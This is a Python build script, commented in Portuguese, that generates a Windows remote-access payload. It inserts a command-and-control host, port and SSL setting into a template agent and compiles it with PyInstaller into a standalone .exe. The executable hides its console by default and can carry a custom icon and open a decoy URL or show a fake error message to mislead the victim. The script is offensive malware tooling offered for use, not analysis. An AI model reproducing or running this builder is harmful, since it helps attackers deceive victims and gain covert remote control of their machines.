import os
import sys
import shutil
import tempfile
import subprocess
import argparse

# Configurar stdout/stderr para UTF-8 se possível
if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

def build_windows_exe(c2_host: str, c2_port: int = 8000, use_ssl: bool = False, build_id: str = "win-001", output_name: str = "WindowsRemoteAgent.exe", icon_path: str = None, hide_console: bool = True, decoy_url: str = "", decoy_message: str = ""):
    """
    Compila o agente Windows (win_agent.py) em um arquivo executável standalone (.exe) usando PyInstaller.
    """
    script_dir = os.path.dirname(os.path.abspath(__file__))
    template_agent = os.path.join(script_dir, "win_agent.py")

    if not os.path.exists(template_agent):
        raise FileNotFoundError(f"Arquivo modelo {template_agent} não encontrado!")

    # Lê o código fonte original
    with open(template_agent, "r", encoding="utf-8") as f:
        code = f.read()

    # Substitui os parâmetros do C2 e Decoy no código
    code = code.replace('C2_HOST = "127.0.0.1"', f'C2_HOST = "{c2_host}"')
    code = code.replace('C2_PORT = 8000', f'C2_PORT = {c2_port}')
    code = code.replace('C2_USE_SSL = False', f'C2_USE_SSL = {use_ssl}')
    code = code.replace('BUILD_ID = "win-default-001"', f'BUILD_ID = "{build_id}"')
    code = code.replace('DECOY_URL = ""', f'DECOY_URL = "{decoy_url or ""}"')
    code = code.replace('DECOY_MESSAGE = ""', f'DECOY_MESSAGE = "{decoy_message or ""}"')

    # Diretório temporário de build
    temp_dir = tempfile.mkdtemp(prefix="win_build_")
    build_py_path = os.path.join(temp_dir, "win_agent_custom.py")

    with open(build_py_path, "w", encoding="utf-8") as f:
        f.write(code)

    print(f"[+] Gerando executavel Windows para C2: {c2_host}:{c2_port}...")

    import re
    # Sanitização estrita de output_name para aceitar APENAS caracteres alfanuméricos, hífen e underscore (previne injeção de parâmetros/comandos)
    raw_name = (output_name or "WindowsRemoteAgent").replace(".exe", "")
    safe_name = re.sub(r'[^a-zA-Z0-9_-]', '', raw_name)
    if not safe_name:
        safe_name = "WindowsRemoteAgent"
    output_name = f"{safe_name}.exe"

    # Comando PyInstaller (Com exclusão dos módulos problemáticos do PIL AVIF no Python 3.14)
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--clean",
        "--hidden-import", "webview",
        "--exclude-module", "PIL._avif",
        "--exclude-module", "pillow_avif",
        "--name", safe_name,
        "--distpath", temp_dir,
        "--workpath", os.path.join(temp_dir, "build"),
        "--specpath", temp_dir
    ]

    if hide_console:
        cmd.append("--noconsole")

    if icon_path and os.path.exists(icon_path):
        cmd.extend(["--icon", icon_path])

    cmd.append(build_py_path)

    # Verifica e instala PyInstaller automaticamente se não estiver instalado no ambiente
    try:
        check_proc = subprocess.run([sys.executable, "-m", "PyInstaller", "--version"], capture_output=True, text=True)
        if check_proc.returncode != 0:
            print("[*] PyInstaller nao encontrado. Instalando via pip...")
            subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True)
    except Exception as e:
        print(f"[*] Tentando instalar pyinstaller via pip: {e}")
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"])
        except Exception:
            pass

    print(f"[*] Executando PyInstaller...")
    proc = subprocess.run(cmd, capture_output=True, text=True)


    if proc.returncode != 0:
        print(f"[-] Erro ao compilar com PyInstaller:\n{proc.stderr}")
        shutil.rmtree(temp_dir, ignore_errors=True)
        return False, proc.stderr

    compiled_exe = os.path.join(temp_dir, output_name if output_name.endswith(".exe") else f"{output_name}.exe")
    
    # Destino final na pasta de downloads do servidor
    downloads_dir = os.path.abspath(os.path.join(script_dir, "..", "downloads"))
    os.makedirs(downloads_dir, exist_ok=True)
    
    final_output_path = os.path.join(downloads_dir, output_name if output_name.endswith(".exe") else f"{output_name}.exe")
    shutil.copy2(compiled_exe, final_output_path)
    
    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"[+] Executavel gerado com sucesso em: {final_output_path}")
    return True, final_output_path

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Gerador de Payload .EXE Windows")
    parser.add_argument("--host", default="127.0.0.1", help="Host/IP do servidor C2")
    parser.add_argument("--port", type=int, default=8000, help="Porta do servidor C2")
    parser.add_argument("--ssl", action="store_true", help="Usar SSL/WSS")
    parser.add_argument("--build-id", default="win-001", help="ID do Build")
    parser.add_argument("--output", default="WindowsControl.exe", help="Nome do arquivo .exe gerado")
    parser.add_argument("--decoy-url", default="", help="URL para abrir automaticamente ao executar")
    parser.add_argument("--decoy-message", default="", help="Mensagem de erro/alerta para exibir ao executar")
    parser.add_argument("--console", action="store_true", help="Mostrar janela de console (para debug)")

    args = parser.parse_args()
    success, result = build_windows_exe(
        c2_host=args.host,
        c2_port=args.port,
        use_ssl=args.ssl,
        build_id=args.build_id,
        output_name=args.output,
        hide_console=not args.console,
        decoy_url=args.decoy_url,
        decoy_message=args.decoy_message
    )
    if not success:
        sys.exit(1)
